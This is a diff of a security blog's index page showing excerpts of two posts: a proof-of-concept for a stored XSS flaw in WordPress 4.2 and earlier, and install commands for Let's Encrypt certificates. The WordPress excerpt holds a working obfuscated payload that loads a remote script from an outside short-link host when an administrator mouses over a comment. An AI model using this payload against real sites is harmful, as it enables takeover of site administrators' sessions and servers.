+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/" itemprop="url">
+                  WordPress 4.2 Stored XSS Getshell via XSS Platform
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-13T00:56:15+08:00" content="2016-06-13">
+              2016-06-13
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h4 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h4><p>WordPress 4.2 Stored XSS<br>受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3<br>匿名评论后管理员前台触发，覆盖率全屏窗口</p>
+<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a title=&apos;x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createElement%28%27script%27%29%29.src%3D%27http%3A%2f%2ft.cn%2fR5ivC0L%27%5D/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAA...[64kb]..AAAAA&apos;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/06/13/WordPress-4-2-Stored-XSS-Getshell-via-XSS-Platform/#more" rel="contents">
+              Weiterlesen &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/" itemprop="url">
+                  Automatic deployment Let's Encrypt Certificate
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-01T16:16:52+08:00" content="2016-06-01">
+              2016-06-01
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo apt-get install letsencrypt -t jessie-backports # Debian 8</span><br><span class="line">&gt; sudo apt-get install letsencrypt                     # Debian testing/unstable, Ubuntu 16.04</span><br><span class="line">&gt; wget https://dl.eff.org/certbot-auto                 # CentOS/RHEL 7</span><br><span class="line">&gt; chmod a+x certbot-auto                               # CentOS/RHEL 7</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/06/01/Automatic-deployment-Let-s-Encrypt-Certificate/#more" rel="contents">
+              Weiterlesen &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -322,6 +2337,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -353,14 +2372,14 @@
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
-               alt="John Doe" />
-          <p class="site-author-name" itemprop="name">John Doe</p>
-          <p class="site-description motion-element" itemprop="description"></p>
+               alt="xl7dev" />
+          <p class="site-author-name" itemprop="name">xl7dev</p>
+          <p class="site-description motion-element" itemprop="description">Information Security</p>
         </div>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">1</span>
+              <span class="site-state-item-count">43</span>
               <span class="site-state-item-name">Artikel</span>
             </a>
           </div>
@@ -368,12 +2387,57 @@
           
 
           
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
 
         </nav>
 
         
 
         <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://blog.knownsec.com" target="_blank" title="Knownsec">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Knownsec
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://javaweb.org" target="_blank" title="园长">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  园长
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://jeary.org" target="_blank" title="jeary">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  jeary
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.thinkings.org" target="_blank" title="Tr3jer">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Tr3jer
+                </a>
+              </span>
+            
           
         </div>
 
@@ -404,7 +2468,7 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+  <span class="author" itemprop="copyrightHolder">xl7dev</span>
 </div>
 
 <div class="powered-by">
